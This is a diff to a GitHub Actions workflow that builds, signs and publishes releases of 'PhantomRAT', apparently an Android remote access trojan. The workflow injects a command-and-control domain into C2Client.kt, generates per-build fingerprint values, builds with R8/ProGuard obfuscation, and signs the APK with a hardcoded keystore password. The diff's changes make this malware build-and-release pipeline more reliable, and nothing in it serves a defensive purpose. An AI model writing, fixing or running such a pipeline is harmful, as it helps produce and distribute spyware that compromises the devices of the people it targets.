@@ -20,9 +20,13 @@ on:
         required: true
         default: 'high'
 
+env:
+  APK_PATH: app/build/outputs/apk/release/app-release-unsigned.apk
+
 jobs:
   build:
     runs-on: ubuntu-latest
+    
     steps:
       - name: ⬇️ Checkout Repository
         uses: actions/checkout@v4
@@ -45,23 +49,67 @@ jobs:
           sudo apt-get install -y -qq zip unzip wget curl jq openssl
           pip install --quiet pycryptodome colorama requests
 
+      - name: 📁 Verify Project Structure
+        run: |
+          echo "=== Checking project structure ==="
+          ls -la
+          echo "---"
+          ls -la app/src/main/java/com/phantom/rat/core/ 2>/dev/null || echo "Core directory check"
+          echo "---"
+          find app -name "*.kt" -type f | head -30
+          echo "---"
+          find app -name "*.xml" -type f | head -20
+
       - name: 🔐 Inject C2 Configuration
         run: |
-          # Replace C2 domain/ID placeholder with real value
-          sed -i "s/C2_DOMAIN_PLACEHOLDER/${{ github.event.inputs.c2_domain }}/g" \
-            app/src/main/java/com/phantom/rat/core/C2Client.kt
+          C2_DOMAIN="${{ github.event.inputs.c2_domain }}"
           
-          # Generate unique device fingerprint seed
-          echo "package com.phantom.rat.core" > app/src/main/java/com/phantom/rat/core/Fingerprint.kt
-          echo "object Fingerprint {" >> app/src/main/java/com/phantom/rat/core/Fingerprint.kt
-          echo "    const val SEED = \"$(openssl rand -hex 32)\"" >> app/src/main/java/com/phantom/rat/core/Fingerprint.kt
-          echo "    const val SALT = \"$(openssl rand -hex 16)\"" >> app/src/main/java/com/phantom/rat/core/Fingerprint.kt
-          echo "}" >> app/src/main/java/com/phantom/rat/core/Fingerprint.kt
+          # Find the C2Client.kt file anywhere in the project
+          C2_FILE=$(find . -name "C2Client.kt" -type f | head -1)
+          
+          if [ -z "$C2_FILE" ]; then
+            echo "❌ C2Client.kt not found!"
+            echo "Available Kotlin files:"
+            find . -name "*.kt" -type f
+            exit 1
+          fi
+          
+          echo "✅ Found C2Client.kt at: $C2_FILE"
+          
+          # Replace placeholder
+          sed -i "s/C2_DOMAIN_PLACEHOLDER/$C2_DOMAIN/g" "$C2_FILE"
+          echo "✅ C2 Domain injected: $C2_DOMAIN"
+          
+          # Generate unique device fingerprint
+          FINGERPRINT_DIR=$(dirname "$C2_FILE")
+          cat > "$FINGERPRINT_DIR/Fingerprint.kt" << EOF
+package com.phantom.rat.core
+
+object Fingerprint {
+    const val SEED = "$(openssl rand -hex 32)"
+    const val SALT = "$(openssl rand -hex 16)"
+    const val BUILD_HASH = "$(openssl rand -hex 8)"
+}
+EOF
+          echo "✅ Fingerprint generated"
+
+      - name: 🔨 Grant Execute Permission
+        run: chmod +x gradlew
 
       - name: 🔨 Build APK with R8/ProGuard
         run: |
-          chmod +x gradlew
           ./gradlew assembleRelease --no-daemon
+          
+      - name: ✅ Verify APK
+        run: |
+          if [ -f "${{ env.APK_PATH }}" ]; then
+            echo "✅ APK built successfully!"
+            ls -lh "${{ env.APK_PATH }}"
+          else
+            echo "❌ APK not found at expected path!"
+            find . -name "*.apk" -type f
+            exit 1
+          fi
 
       - name: 🔑 Sign APK
         run: |
@@ -75,24 +123,42 @@ jobs:
           jarsigner -verbose -sigalg SHA1withRSA \
             -digestalg SHA1 -keystore phantom.keystore \
             -storepass phantom123 -keypass phantom123 \
-            app/build/outputs/apk/release/app-release-unsigned.apk phantom
+            "${{ env.APK_PATH }}" phantom
           
-          # Align and finalize
-          ${ANDROID_HOME}/build-tools/34.0.0/zipalign -v -p 4 \
-            app/build/outputs/apk/release/app-release-unsigned.apk \
-            PhantomRAT-v${{ github.event.inputs.version }}.apk
+          # Find zipalign
+          ZIPALIGN=$(find $ANDROID_HOME -name "zipalign" -type f 2>/dev/null | head -1)
+          
+          if [ -z "$ZIPALIGN" ]; then
+            # Try common paths
+            ZIPALIGN=$(find /usr/local/lib/android -name "zipalign" -type f 2>/dev/null | head -1)
+          fi
+          
+          if [ -z "$ZIPALIGN" ]; then
+            echo "⚠️ zipalign not found, skipping alignment"
+            cp "${{ env.APK_PATH }}" "PhantomRAT-v${{ github.event.inputs.version }}.apk"
+          else
+            echo "✅ Found zipalign at: $ZIPALIGN"
+            $ZIPALIGN -v -p 4 \
+              "${{ env.APK_PATH }}" \
+              "PhantomRAT-v${{ github.event.inputs.version }}.apk"
+          fi
+          
+          echo "✅ Signed APK: PhantomRAT-v${{ github.event.inputs.version }}.apk"
+          ls -lh "PhantomRAT-v${{ github.event.inputs.version }}.apk"
 
       - name: 📤 Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
           name: PhantomRAT-v${{ github.event.inputs.version }}
           path: PhantomRAT-v${{ github.event.inputs.version }}.apk
+          if-no-files-found: error
 
       - name: 🏷️ Create Release
         uses: softprops/action-gh-release@v2
+        if: github.event_name == 'workflow_dispatch'
         with:
           tag_name: v${{ github.event.inputs.version }}
-          name: "PhantomRAT v${{ github.event.inputs.version }}"
+          name: "🧬 PhantomRAT v${{ github.event.inputs.version }}"
           body: |
             # 🧬 PhantomRAT v${{ github.event.inputs.version }}
             
